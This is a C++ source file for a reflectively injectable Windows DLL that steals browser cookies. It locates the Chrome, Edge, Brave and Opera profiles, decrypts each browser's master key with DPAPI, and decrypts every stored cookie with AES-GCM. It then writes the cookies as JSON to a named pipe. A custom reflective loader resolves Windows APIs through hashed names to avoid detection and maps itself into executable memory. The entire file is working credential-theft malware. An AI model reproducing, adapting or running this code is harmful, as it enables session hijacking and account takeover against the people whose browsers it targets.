// dllmain.cpp (v12.1, Corrected Raw Size Calculation)
#include "pch.h"

#ifndef NTSTATUS
typedef long NTSTATUS;
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define NOMINMAX
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winternl.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <wrl/client.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <memory>
#include <stdexcept>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <map>

#include "sqlite3.h"
#include "json.hpp"

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

namespace fs = std::filesystem;
using json = nlohmann::json;
using byte = unsigned char;


namespace {
    typedef struct _UNICODE_STRING_COMPATIBLE { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING_COMPATIBLE, * PUNICODE_STRING_COMPATIBLE;
    typedef struct _LDR_DATA_TABLE_ENTRY_COMPATIBLE { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING_COMPATIBLE FullDllName; UNICODE_STRING_COMPATIBLE BaseDllName; } LDR_DATA_TABLE_ENTRY_COMPATIBLE, * PLDR_DATA_TABLE_ENTRY_COMPATIBLE;
    typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);
    typedef FARPROC(WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
    typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    DWORD HashString(const char* str) { DWORD hash = 5381; int c; while ((c = *str++)) hash = ((hash << 5) + hash) + c; return hash; }
    DWORD HashStringW(const wchar_t* str) { DWORD hash = 5381; wchar_t c; while ((c = *str++)) { wchar_t lower_c = (c >= L'A' && c <= L'Z') ? (c - L'A' + L'a') : c; hash = ((hash << 5) + hash) + lower_c; } return hash; }
}

enum class ProtectionLevel { None = 0, PathValidationOld = 1, PathValidation = 2, Max = 3 };
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

namespace Payload {
    namespace Utils {
        std::string WToUtf8(const std::wstring& w) { if (w.empty()) return {}; int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr); if (len <= 0) return {}; std::string out(len - 1, '\0'); WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &out[0], len, nullptr, nullptr); return out; }
        fs::path GetLocalAppDataPath() { PWSTR p = nullptr; if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &p))) { fs::path r(p); CoTaskMemFree(p); return r; } throw std::runtime_error("Failed to get Local AppData path."); }
        std::map<std::wstring, fs::path> GetBrowserUserDataPaths() { std::map<std::wstring, fs::path> p; fs::path l = GetLocalAppDataPath(), a = l.parent_path() / "Roaming"; std::vector<std::pair<std::wstring, fs::path>> c = { {L"Google Chrome", l / "Google" / "Chrome" / "User Data"}, {L"Microsoft Edge", l / "Microsoft" / "Edge" / "User Data"}, {L"Brave", l / "BraveSoftware" / "Brave-Browser" / "User Data"}, {L"Opera", a / "Opera Software" / "Opera Stable"} }; for (const auto& i : c) { if (fs::exists(i.second)) p[i.first] = i.second; } return p; }
        std::vector<byte> Base64Decode(const std::string& in) { DWORD s = 0; if (!CryptStringToBinaryA(in.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &s, nullptr, nullptr)) return {}; std::vector<byte> d(s); if (!CryptStringToBinaryA(in.c_str(), 0, CRYPT_STRING_BASE64, d.data(), &s, nullptr, nullptr)) return {}; return d; }
    }
    namespace Crypto {
        std::vector<byte> DecryptGcm(const std::vector<byte>& key, const std::vector<byte>& blob) { size_t o = 0; if (blob.size() > 3 && blob[0] == 'v')o = 3; if (blob.size() < o + 12 + 16)return{}; BCRYPT_ALG_HANDLE a = nullptr; if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&a, BCRYPT_AES_ALGORITHM, nullptr, 0)))return{}; BCRYPT_KEY_HANDLE k = nullptr; std::vector<byte> p; BCryptSetProperty(a, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0); if (BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(a, &k, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0))) { const byte* iv = blob.data() + o, * ct = iv + 12, * t = blob.data() + blob.size() - 16; ULONG cl = (ULONG)(blob.size() - o - 12 - 16); BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO i; BCRYPT_INIT_AUTH_MODE_INFO(i); i.pbNonce = (PUCHAR)iv; i.cbNonce = 12; i.pbTag = (PUCHAR)t; i.cbTag = 16; p.resize(cl > 0 ? cl : 1); ULONG ol = 0; NTSTATUS s = BCryptDecrypt(k, (PUCHAR)ct, cl, &i, nullptr, 0, p.data(), (ULONG)p.size(), &ol, 0); if (NT_SUCCESS(s))p.resize(ol); else p.clear(); BCryptDestroyKey(k); } BCryptCloseAlgorithmProvider(a, 0); return p; }
    }
class PipeLogger { public: PipeLogger(LPCWSTR p) { m_h = CreateFileW(p, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr); } ~PipeLogger() { if (isValid()) { Log("\n__DLL_PIPE_COMPLETION_SIGNAL__\n"); CloseHandle(m_h); } } bool isValid()const { return m_h != INVALID_HANDLE_VALUE; } void Log(const std::string& m) { if (isValid() && !m.empty()) { DWORD w = 0; WriteFile(m_h, m.c_str(), (DWORD)m.length(), &w, nullptr); } } private: HANDLE m_h = INVALID_HANDLE_VALUE; };
                         void DecryptionOrchestrator(LPCWSTR pipeName) { if (!pipeName || !*pipeName) return; PipeLogger logger(pipeName); if (!logger.isValid()) return; logger.Log("[+] Pipe logger initialized.\n"); try { if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) throw std::runtime_error("CoInitializeEx failed."); logger.Log("[+] COM library initialized.\n"); auto paths = Utils::GetBrowserUserDataPaths(); if (paths.empty()) throw std::runtime_error("No supported browsers found."); json all_cookies = json::array(); for (const auto& [bname, uroot] : paths) { logger.Log("\n[*] Processing: " + Utils::WToUtf8(bname) + "\n"); fs::path lpath = uroot / "Local State"; if (!fs::exists(lpath)) { logger.Log(" [-] Local State not found.\n"); continue; } std::vector<byte> mkey; try { std::ifstream f(lpath); if (!f)continue; json s; f >> s; std::string k64 = s["os_crypt"]["encrypted_key"]; auto dk = Utils::Base64Decode(k64); if (dk.size() <= 5 || memcmp(dk.data(), "DPAPI", 5) != 0) { logger.Log(" [-] Non-DPAPI key found.\n"); continue; } DATA_BLOB in; in.pbData = (BYTE*)dk.data() + 5; in.pbData = dk.data() + 5; in.cbData = (DWORD)dk.size() - 5; DATA_BLOB out; if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) { mkey.assign(out.pbData, out.pbData + out.cbData); LocalFree(out.pbData); logger.Log(" [+] Master key decrypted.\n"); } else { logger.Log(" [-] Master key decryption failed.\n"); continue; } } catch (...) { logger.Log(" [-] Exception during key decryption.\n"); continue; } if (mkey.empty()) continue; std::vector<fs::path> profiles; if (fs::exists(uroot / "Default"))profiles.push_back(uroot / "Default"); for (int i = 1; i <= 10; ++i) { fs::path p = uroot / ("Profile " + std::to_string(i)); if (fs::exists(p))profiles.push_back(p); } for (const auto& ppath : profiles) { fs::path dbPath = ppath / "Network" / "Cookies"; if (!fs::exists(dbPath))continue; logger.Log(" [>] Profile: " + ppath.filename().string() + "\n"); fs::path tmp = fs::temp_directory_path() / ("c" + std::to_string(GetTickCount64()) + ".db"); std::error_code ec; fs::copy_file(dbPath, tmp, fs::copy_options::overwrite_existing, ec); if (ec)continue; sqlite3* db; if (sqlite3_open(tmp.string().c_str(), &db) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT host_key,name,path,is_secure,expires_utc,encrypted_value FROM cookies", -1, &stmt, 0) == SQLITE_OK) { while (sqlite3_step(stmt) == SQLITE_ROW) { const byte* blob = (const byte*)sqlite3_column_blob(stmt, 5); int size = sqlite3_column_bytes(stmt, 5); auto pval = Crypto::DecryptGcm(mkey, { blob,blob + size }); if (!pval.empty()) { json c; c["host"] = (const char*)sqlite3_column_text(stmt, 0); c["name"] = (const char*)sqlite3_column_text(stmt, 1); c["path"] = (const char*)sqlite3_column_text(stmt, 2); c["secure"] = sqlite3_column_int(stmt, 3) == 1; c["expires"] = sqlite3_column_int64(stmt, 4); c["value"] = std::string(pval.begin(), pval.end()); all_cookies.push_back(c); } } } sqlite3_finalize(stmt); } sqlite3_close(db); fs::remove(tmp, ec); } } if (!all_cookies.empty())logger.Log(all_cookies.dump(2)); else logger.Log("[-] No cookies found.\n"); CoUninitialize(); logger.Log("\n[*] Finished.\n"); } catch (const std::exception& e) { logger.Log("[-] DLL ERROR: " + std::string(e.what()) + "\n"); } }
}

static size_t g_dwRawDllSize = 0;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        if (lpReserved && g_dwRawDllSize > 0) {
            LPCWSTR pipeName = (LPCWSTR)((ULONG_PTR)lpReserved + g_dwRawDllSize);
            Payload::DecryptionOrchestrator(pipeName);
        }
    }
    return TRUE;
}

#pragma warning(push)
#pragma warning(disable: 4005 4055 4201)
extern "C" __declspec(dllexport) PVOID WINAPI ReflectiveLoader(LPVOID lpParameter) {
    LoadLibraryA_t pLoadLibraryA = NULL; GetProcAddress_t pGetProcAddress = NULL; VirtualAlloc_t pVirtualAlloc = NULL;
#ifdef _WIN64
    PEB* pPeb = (PEB*)__readgsqword(0x60);
#else
    PEB* pPeb = (PEB*)__readfsdword(0x30);
#endif
    LIST_ENTRY* head = &pPeb->Ldr->InMemoryOrderModuleList; LIST_ENTRY* current = head->Flink; HMODULE hKernel32 = NULL;
    while (current != head) { LDR_DATA_TABLE_ENTRY_COMPATIBLE* entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_COMPATIBLE, InMemoryOrderLinks); if (HashStringW(entry->BaseDllName.Buffer) == 0x66c42fb6) { hKernel32 = (HMODULE)entry->DllBase; break; } current = current->Flink; }
    if (!hKernel32) return NULL;
    IMAGE_DOS_HEADER* k32_dos = (IMAGE_DOS_HEADER*)hKernel32; IMAGE_NT_HEADERS* k32_nt = (IMAGE_NT_HEADERS*)((BYTE*)hKernel32 + k32_dos->e_lfanew); IMAGE_EXPORT_DIRECTORY* k32_exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hKernel32 + k32_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hKernel32 + k32_exports->AddressOfNames); WORD* ordinals = (WORD*)((BYTE*)hKernel32 + k32_exports->AddressOfNameOrdinals); DWORD* functions = (DWORD*)((BYTE*)hKernel32 + k32_exports->AddressOfFunctions);
    for (DWORD i = 0; i < k32_exports->NumberOfNames; i++) { const char* name = (const char*)((BYTE*)hKernel32 + names[i]); if (HashString(name) == 0x7802f74a) pLoadLibraryA = (LoadLibraryA_t)((BYTE*)hKernel32 + functions[ordinals[i]]); else if (HashString(name) == 0x7c0dfcaa) pGetProcAddress = (GetProcAddress_t)((BYTE*)hKernel32 + functions[ordinals[i]]); else if (HashString(name) == 0xe553a458) pVirtualAlloc = (VirtualAlloc_t)((BYTE*)hKernel32 + functions[ordinals[i]]); if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc) break; }
    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc) return NULL;

    PIMAGE_DOS_HEADER pRawDosHeader = (PIMAGE_DOS_HEADER)lpParameter;
    PIMAGE_NT_HEADERS pRawNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpParameter + pRawDosHeader->e_lfanew);

    // ================== FIX START ==================
    // PE 헤더를 순회하여 파일 상의 실제 DLL 크기를 정확히 계산합니다.
    size_t calculatedSize = pRawNtHeaders->OptionalHeader.SizeOfHeaders;
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pRawNtHeaders);
    for (UINT i = 0; i < pRawNtHeaders->FileHeader.NumberOfSections; i++) {
        size_t endOfSection = (size_t)pSectionHeader[i].PointerToRawData + (size_t)pSectionHeader[i].SizeOfRawData;
        if (endOfSection > calculatedSize) {
            calculatedSize = endOfSection;
        }
    }
    g_dwRawDllSize = calculatedSize;
    // =================== FIX END ===================

    BYTE* pImageBase = (BYTE*)pVirtualAlloc(NULL, pRawNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) return NULL;

    memcpy(pImageBase, (void*)lpParameter, pRawNtHeaders->OptionalHeader.SizeOfHeaders);
    for (UINT i = 0; i < pRawNtHeaders->FileHeader.NumberOfSections; i++) { memcpy(pImageBase + pSectionHeader[i].VirtualAddress, (void*)((ULONG_PTR)lpParameter + pSectionHeader[i].PointerToRawData), pSectionHeader[i].SizeOfRawData); }

    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pImageBase + pRawNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (pImportDesc->Name) { HMODULE hMod = pLoadLibraryA((char*)(pImageBase + pImportDesc->Name)); if (hMod) { PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pImageBase + pImportDesc->FirstThunk); PIMAGE_THUNK_DATA pOrigThunk = (PIMAGE_THUNK_DATA)(pImageBase + pImportDesc->OriginalFirstThunk); while (pOrigThunk->u1.AddressOfData) { if (IMAGE_SNAP_BY_ORDINAL(pOrigThunk->u1.Ordinal)) { pThunk->u1.Function = (ULONG_PTR)pGetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(pOrigThunk->u1.Ordinal)); } else { PIMAGE_IMPORT_BY_NAME pImport = (PIMAGE_IMPORT_BY_NAME)(pImageBase + pOrigThunk->u1.AddressOfData); pThunk->u1.Function = (ULONG_PTR)pGetProcAddress(hMod, pImport->Name); } pThunk++; pOrigThunk++; } } pImportDesc++; }

    ptrdiff_t delta = (ptrdiff_t)(pImageBase - (BYTE*)pRawNtHeaders->OptionalHeader.ImageBase);
    if (delta) { if (pRawNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) { PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pImageBase + pRawNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); while (pReloc->VirtualAddress) { WORD* entries = (WORD*)(pReloc + 1); int count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (int i = 0; i < count; i++) { if (entries[i] >> 12 == IMAGE_REL_BASED_DIR64) { *(ULONG_PTR*)(pImageBase + pReloc->VirtualAddress + (entries[i] & 0xFFF)) += delta; } } pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock); } } }

    void (WINAPI * DllMainEntry)(HINSTANCE, DWORD, LPVOID);
    DllMainEntry = (decltype(DllMainEntry))(pImageBase + pRawNtHeaders->OptionalHeader.AddressOfEntryPoint);
    DllMainEntry((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, lpParameter);

    return pImageBase;
}
#pragma warning(pop)